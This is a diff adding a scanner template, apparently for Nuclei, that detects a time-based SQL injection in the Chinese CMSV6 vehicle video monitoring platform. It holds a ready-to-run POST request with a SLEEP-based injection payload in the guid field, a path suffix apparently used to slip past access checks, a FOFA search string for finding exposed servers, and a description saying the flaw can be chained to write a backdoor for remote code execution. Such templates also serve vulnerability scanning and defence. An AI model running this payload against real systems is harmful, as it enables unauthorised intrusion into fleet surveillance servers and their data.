@@ -1,0 +1,41 @@
+id: gsky-cmsv6-getAlarmAppealByGuid-sqli
+info:
+  name: 通天星 CMSV6 车载视频监控平台 getAlarmAppealByGuid - sqli
+  author: leadlife
+  severity: high
+  description: 该漏洞是由于通天星CMSV6车载定位监控平台 /alarm_appeal/getAlarmAppealByGuid 接口处未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。该漏洞可配合任意文件读取获取网站绝对路径写入后门文件进行远程代码执行。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E9%80%9A%E5%A4%A9%E6%98%9F/%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0getAlarmAppealByGuid%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="./open/webApi.html"||body="/808gps/"
+    hunter-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: 2024,sqli,time,g-sky
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /alarm_appeal/getAlarmAppealByGuid;downloadLogger.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        
+        guid=1') AND (SELECT 3904 FROM (SELECT(SLEEP(6)))PITq) AND ('qhqF'='qhqF
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'resMap')
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
